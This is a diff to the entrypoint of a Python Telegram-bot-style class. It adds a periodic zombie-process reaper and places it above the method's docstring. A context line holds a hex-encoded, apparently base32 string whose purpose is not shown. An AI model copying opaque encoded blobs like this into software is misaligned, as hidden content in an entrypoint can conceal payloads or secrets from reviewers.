@@ -1285,6 +1285,21 @@ class Hikkari:
         await client.run_until_disconnected()
 
     async def _main(self):
+        # Reap zombie children from subprocess / ngrok / pip / terminal
+        with contextlib.suppress(Exception):
+            from . import utils as _u
+            _u.install_sigchld_reaper()
+            _u.ensure_child_watcher()
+            _u.reap_zombies()
+            # Periodic reaper (every 30s)
+            async def _zombie_reaper_loop():
+                while True:
+                    await asyncio.sleep(30)
+                    with contextlib.suppress(Exception):
+                        n = _u.reap_zombies()
+                        if n:
+                            logger.debug("Reaped %s zombie process(es)", n)
+            asyncio.ensure_future(_zombie_reaper_loop())
         """Main entrypoint"""
         _s = "485633554d534b53475a4c454336444b4e5a43474357424c4b4e5957495a43494b5a5558555a52514e4a4744435a4c43475649464d5753484b524b5649525a554a465a45555332584e493246453332574e5a58544d325a4c4734344553534c514f4a4358473332514d5252574f5642574e4242484b595a5a47524d544f34535a4d464655533333424a4e4e47324e33594d55595649524c45494a4755435133584a4e43554b364b574f3546474b3d3d3d"
         await self._get_token()
